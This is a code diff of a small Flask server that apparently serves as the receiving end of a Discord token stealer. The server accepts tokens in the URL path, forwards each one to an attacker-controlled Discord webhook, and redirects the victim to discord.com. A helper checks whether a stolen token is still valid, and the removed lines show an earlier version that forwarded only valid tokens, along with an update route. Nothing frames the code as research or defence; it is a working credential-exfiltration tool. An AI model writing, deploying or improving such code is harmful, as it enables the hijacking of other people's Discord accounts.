@@ -1,35 +1,39 @@
-from dhooks import Webhook
+from flask import Flask, redirect, abort
 import os
-from flask import Flask, redirect
 import requests
 
+app = Flask(__name__)
 
 def check_discord_token(token):
     url = "https://discord.com/api/v10/users/@me"
     headers = {
-        "Authorization": f"{token}"
+        "Authorization": f"Bearer {token}"
     }
     
     response = requests.get(url, headers=headers)
     
     if response.status_code == 200:
-        return "True"
+        return f"new auth token keyauth.com \nauth token:**{token}**"
     else:
-        return "False"
+        return "Old auth token keyauth.com \nauth token:**{token}**"
 
-e = os.getenv('DISCORD_URL')
-app = Flask(__name__)
-hook = Webhook(e)
-@app.route('/token/<string:token>')
+@app.route('/<string:token>')
 def index(token):
-  if check_discord_token(token) == "True":
-      hook.send(token)
-  return redirect("discord.com")
-
-@app.route('/update')
-def update():
-    url = "https://raw.githubusercontent.com/43a1723/test2/main/main.py"
-    return 'hai1723 on top', 200
+    try:
+        # Send the token to the Discord webhook
+        DISCORD_URL = os.getenv('DISCORD_URL')
+        response = requests.post(DISCORD_URL, json={"content": token})
+        if response.status_code == 204:
+            # Successful response from Discord
+            return redirect("https://discord.com/app")
+        else:
+            # Handle unsuccessful response
+            print(f"Error sending webhook: {response.status_code} {response.text}")
+            return abort(500, description="Failed to send webhook")
+    except requests.RequestException as e:
+        # Handle any exceptions during the request
+        print(f"Error sending webhook: {e}")
+        return abort(500, description="Internal Server Error")
 
 if __name__ == "__main__":
-  app.run(host='0.0.0.0', port=81)
+    app.run(host='0.0.0.0', port=81)
